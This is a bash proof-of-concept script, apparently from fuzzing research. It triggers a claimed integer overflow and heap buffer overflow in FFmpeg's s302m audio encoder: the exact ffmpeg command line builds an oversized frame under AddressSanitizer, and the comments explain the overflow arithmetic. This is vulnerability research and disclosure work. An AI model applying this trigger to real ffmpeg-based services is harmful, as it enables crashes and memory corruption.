#!/bin/bash
# PoC run script for:
#   VULN 001 - Integer Overflow in s302m_encode2_frame() (libavcodec/s302menc.c)
#
# Trigger: feed a single 536870912-sample stereo s16 frame to the s302m encoder.
#   nb_samples=536870912, nb_channels=2, bits_per_raw_sample=16
#   buf_size = 4 + (536870912 * 2 * 20) / 8 = 4 + 0 = 4  (int32 overflow wraps to 0)
#   Guard check: 0 > 65535 => false => bypassed
#   ff_get_encode_buffer allocates 4 bytes; encoder writes 5 bytes per sample => heap overflow
#
# Memory requirement: ~2 GB RAM (the frame holds 536870912 * 2 * 2 bytes of PCM data).
# With ASAN, the overflow is caught on the very first out-of-bounds write.

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Running overflow analysis generator..."
python3 vuln_001_gen.py

echo ""
echo "[*] Checking available memory..."
free -h

echo ""
echo "[*] Attempting to trigger integer overflow in s302m_encode2_frame()..."
echo "    Using: anullsrc lavfi source -> asetnsamples=536870912 -> s302m encoder"
echo "    (Requires ~2 GB RAM; will OOM on low-memory systems)"
echo ""

ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001" \
  "$BIN" \
    -f lavfi \
    -i "anullsrc=cl=stereo:r=48000" \
    -af "asetnsamples=n=536870912:p=0" \
    -frames:a 1 \
    -c:a s302m \
    -strict experimental \
    -f null - 2>&1 || true

echo ""
echo "[*] Appending any ASAN log output..."
cat asan_001.* 2>/dev/null || echo "(no ASAN log files found)"
